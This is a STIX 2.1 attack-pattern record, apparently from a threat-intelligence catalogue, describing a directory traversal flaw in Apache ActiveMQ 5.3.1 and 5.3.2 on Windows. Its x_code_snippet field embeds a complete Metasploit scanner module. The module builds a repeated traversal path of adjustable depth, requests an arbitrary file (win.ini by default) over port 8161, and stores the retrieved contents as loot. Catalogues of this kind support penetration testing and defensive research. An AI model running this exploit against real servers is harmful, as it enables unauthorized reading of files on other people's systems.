{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f3d6c22b-c50c-483a-87e1-7f6b63458260",
    "created": "2024-08-14T16:30:44.334305Z",
    "modified": "2024-08-14T16:30:44.334308Z",
    "name": "Apache ActiveMQ Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability in Apache ActiveMQ 5.3.1 and 5.3.2 on Windows systems. The vulnerability exists in the Jetty's ResourceHandler installed with the affected versions. This module has been tested successfully on ActiveMQ 5.3.1 and 5.3.2 over Windows 2003 SP2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/apache_activemq_traversal.rb",
            "external_id": "apache_activemq_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=895"
        },
        {
            "source_name": "reference",
            "url": "https://issues.apache.org/jira/browse/amq-2788"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache ActiveMQ Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability in Apache ActiveMQ\n        5.3.1 and 5.3.2 on Windows systems. The vulnerability exists in the Jetty's\n        ResourceHandler installed with the affected versions. This module has been tested\n        successfully on ActiveMQ 5.3.1 and 5.3.2 over Windows 2003 SP2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'AbdulAziz Hariri', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '86401' ],\n          [ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=895' ],\n          [ 'URL', 'https://issues.apache.org/jira/browse/amq-2788' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8161),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\\\win.ini']),\n        OptInt.new('DEPTH', [false, 'Traversal depth if absolute is set to false', 4])\n      ])\n  end\n\n  def run_host(ip)\n    # No point to continue if no filename is specified\n    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?\n      print_error(\"#{rhost}:#{rport} - Please supply FILEPATH\")\n      return\n    end\n\n    travs = \"/\\\\..\" * (datastore['DEPTH'] || 1)\n    travs << \"/\" unless datastore['FILEPATH'][0] == \"\\\\\" or datastore['FILEPATH'][0] == \"/\"\n    travs << datastore['FILEPATH']\n\n    print_status(\"#{rhost}:#{rport} - Sending request...\")\n    res = send_request_cgi({\n      'uri'          => travs,\n      'method'       => 'GET',\n    })\n\n    if res and res.code == 200\n      contents = res.body\n      fname = File.basename(datastore['FILEPATH'])\n      path = store_loot(\n        'apache.activemq',\n        'application/octet-stream',\n        ip,\n        contents,\n        fname\n      )\n      print_status(\"#{rhost}:#{rport} - File saved in: #{path}\")\n    else\n      print_error(\"#{rhost}:#{rport} - Failed to retrieve file\")\n      return\n    end\n  end\nend\n"
}